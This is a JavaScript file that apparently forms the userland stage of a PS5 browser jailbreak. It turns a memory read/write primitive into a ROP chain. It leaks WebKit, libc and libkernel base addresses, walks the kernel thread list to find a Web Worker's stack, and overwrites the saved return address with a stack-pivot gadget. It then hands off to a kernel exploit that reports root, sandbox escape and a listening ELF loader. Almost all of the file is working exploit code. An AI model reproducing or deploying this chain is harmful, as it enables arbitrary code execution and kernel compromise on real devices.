let nogc = [];

function runtimeResolveThreadListRva(p, libKernelBase) {
  const view = new Uint8Array(0x40000);
  const viewPtr = p.leakval(view).add32(0x10);
  p.write8(viewPtr, libKernelBase);
  p.write4(viewPtr.add32(0x8), 0x40000);
  p.write4(viewPtr.add32(0xc), 0x1);
  nogc.push(view);

  const scanEnd = 0x40000;
  const sigs = [
    // lea rax,[rip+d]; mov r15,[rax]; test r15,r15
    { o: 0x48, n: 0x8d, op: 0x05, seq: [0x4c, 0x8b, 0x38, 0x4d, 0x85, 0xff] },
    // lea rax,[rip+d]; mov rax,[rax]; test rax,rax
    { o: 0x48, n: 0x8d, op: 0x05, seq: [0x48, 0x8b, 0x00, 0x48, 0x85, 0xc0] },
  ];

  const counts = new Map(); // rva -> { sites, disp, off }
  for (let off = 0; off + 7 + 6 <= scanEnd; off++) {
    if (view[off] !== 0x48 || view[off + 1] !== 0x8d || view[off + 2] !== 0x05)
      continue;
    let disp =
      view[off + 3] |
      (view[off + 4] << 8) |
      (view[off + 5] << 16) |
      (view[off + 6] << 24) |
      0;
    const tgtRva = off + 7 + disp;
    if (tgtRva < 0x1000 || tgtRva > 0x200000) continue;

    let matched = false;
    for (const s of sigs) {
      let ok = true;
      for (let i = 0; i < s.seq.length; i++) {
        if (view[off + 7 + i] !== s.seq[i]) {
          ok = false;
          break;
        }
      }
      if (ok) {
        matched = true;
        break;
      }
    }
    if (!matched) continue;

    const e = counts.get(tgtRva) || { sites: 0, disp, off };
    e.sites++;
    if (e.sites === 1) {
      e.disp = disp;
      e.off = off;
    }
    counts.set(tgtRva, e);
  }

  if (counts.size === 0) {
    throw new Error(
      "Unable to locate the libkernel thread list for firmware " +
        String(window.fw_str) +
        ".",
    );
  }

  let best = null;
  for (const [rva, e] of counts) {
    if (!best || e.sites > best.e.sites) best = { rva, e };
  }
  // Consensus: the true symbol is referenced from several functions. A single
  // strict-sig hit could still be an unrelated global; require agreement or
  // fail loud (a wrong walk is a hard WebProcess crash, not a JS error).
  if (best.e.sites < 2) {
    throw new Error(
      "Thread-list scan is ambiguous at 0x" +
        (best.rva >>> 0).toString(16) +
        ": " +
        best.e.sites +
        " matching site.",
    );
  }
  return { rva: best.rva, hits: best.e.sites };
}

function countFingerprints(p, stack, expected) {
  // Locked worker: the top 4KB of its 0x80000 stack holds the saved return PC
  // into the libkernel wait loop (libKernelBase + OFFSET_lk_worker_wait_return).
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  // a user pointer we are allowed to deref: canonical 48-bit user space,
  // 8-aligned, not the tiny/low stub pages. Everything garbage fails this.
  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  let head;
  let headInfo = "offsets";
  if (typeof OFFSET_lk__thread_list !== "undefined") {
    head = libKernelBase.add32(OFFSET_lk__thread_list);
  } else {
    // ?threadlist=0xHEX hard-override (fast lane once the value is known)
    const forced =
      (typeof window.AIO_CFG === "object" &&
        window.AIO_CFG !== null &&
        window.AIO_CFG.threadlist) ||
      (/threadlist=0x([0-9a-f]+)/i.exec(location.search) || [])[1] ||
      null;
    if (forced) {
      head = libKernelBase.add32(parseInt(forced, 16));
      headInfo = "config override";
    } else {
      const r = runtimeResolveThreadListRva(p, libKernelBase);
      head = libKernelBase.add32(r.rva);
      headInfo = "runtime sig (" + r.hits + " agreeing sites)";
    }
  }

  // Pass 1: collect every plausibility-gated 0x80000 stack. On a busy
  // SceShellUI there is more than one such thread; first-match picked a
  // non-worker, so the ROP write landed on a stack postMessage never wakes.
  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    // follow the *validated* link, not the raw list field
    thread = next;
  }
  if (stacks.length === 0) {
    throw new Error(
      "failed to find worker. (libkernel thread_list @ 0x" +
        head.toString() +
        " via " +
        headInfo +
        "; scanned " +
        steps +
        " thread nodes)",
    );
  }
  if (typeof OFFSET_lk_worker_wait_return === "undefined") {
    // legacy profile without the wait-loop fingerprint: first candidate (old
    // behaviour, correct for profiles that predate the 13.xx multi-thread list)
    return stacks[0];
  }

  // Pass 2: fingerprint-select. The rop_slave thread parks in the libkernel
  // message wait, so its stack top carries kbase+worker_wait_return. A
  // non-worker 0x80000 thread parks elsewhere and does not.
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0,
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      // worker is still inside postMessage's dispatch epilogue; wait for it
      // to park again before judging the set.
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    // multiple parked candidates are genuinely ambiguous; do not guess.
    throw new Error(
      "worker-stack signature ambiguous: " +
        hits.length +
        "/" +
        stacks.length +
        " plausible 0x80000 stacks are parked at kbase+" +
        (OFFSET_lk_worker_wait_return >>> 0).toString(16),
    );
  }
  throw new Error(
    "no plausible 0x80000 stack parked at kbase+" +
      (OFFSET_lk_worker_wait_return >>> 0).toString(16) +
      " after retries (" +
      stacks.length +
      " candidates scanned)",
  );
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  // The worker may answer immediately before returning to its idle wait.
  // The exact saved PC is the firmware-specific fingerprint. Do not require
  // the following qword to resemble an RSP: that adjacent slot is ABI/frame
  // layout dependent and 13.xx legitimately does not satisfy that heuristic.
  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(
    `worker wait return fingerprint count ${lastCount}, expected 1`,
  );
}

function log(message, type = "log") {
  window.writeLog(message, type);
}

// Cold starts can take several seconds on the console.
const ROP_WAIT_MS = 20000;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  let libSceNKWebKitBase = null;
  const ctor = globalThis.__ps5NativeCtor;
  if (
    typeof OFFSET_wk_host_constructor_candidates !== "undefined" &&
    OFFSET_wk_host_constructor_candidates.length &&
    typeof ctor === "number"
  ) {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const base = ctor - offset;
      if (
        base >= 0x800000000 &&
        base < 0x900000000 &&
        base % 0x4000 === 0
      ) {
        libSceNKWebKitBase = new int64(
          base % 0x100000000,
          Math.floor(base / 0x100000000),
        );
        break;
      }
    }
  }
  if (libSceNKWebKitBase === null)
    throw new Error("no host-constructor candidate gave a valid base (ctor=0x"+String(ctor)+")");

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing =
      type === 1
        ? new Uint8Array(1000 + size)
        : new Uint32Array(0x10000 + size);
    allocations.push(backing);

    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  const worker = new Worker("/src/utils/rop_slave.js");

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  const originalContext = malloc(0x40);

  let returnAddress;
  if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
    returnAddress = await findWorkerReturnSlot(
      p,
      workerStack,
      libKernelBase,
    );
  } else {
    // Backward-compatible path for original profiles without a saved-PC fingerprint.
    returnAddress = workerStack.add32(OFFSET_WORKER_STACK_OFFSET);
  }
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  async function launchChain(chain) {
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    const completed = await new Promise((resolve) => {
      let settled = false;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (!completed) {
      throw new Error("the rop worker never answered in " + ROP_WAIT_MS / 1000 + "s - refusing to continue on a chain that never ran. (Reload.)",
      );
    }
  }

  const runtime = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    leakval: p.leakval,
    pre_chain: prepareChain,
    launch_chain: launchChain,
    malloc,
    stringify,
    writestr,
    libSceLibcInternalBase,
    libKernelBase,
    syscalls,
    gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  const pid = await chain.syscall(SYS_GETPID);
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    throw new Error("Worker chain did not execute; the return slot is unchanged.",);
  }

  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}

async function main(userlandRW) {
  const { p, chain } = await prepareRop(userlandRW);

  let runExploit = globalThis.runAioExploit;
  if (typeof runExploit !== "function") {
    const module = await import("./aio_exploit.js");
    runExploit = module.runKernelExploit;
  }
  if (typeof runExploit !== "function")
    throw new Error("aio_exploit.js does not export runKernelExploit");

  const result = await runExploit(p, chain, log);
  if (!result || !result.done)
    throw new Error("kernel exploit did not finish");

  log(result.elfldr ? "kernel chain complete; elfldr is listening on 127.0.0.1:9021" : "kernel chain complete; root and sandbox escape are active", "info");
}

let fwScript = document.createElement("script");
document.body.appendChild(fwScript);

fwScript.setAttribute("src", `offsets/${window.fw_str}.js?v=` + Date.now());
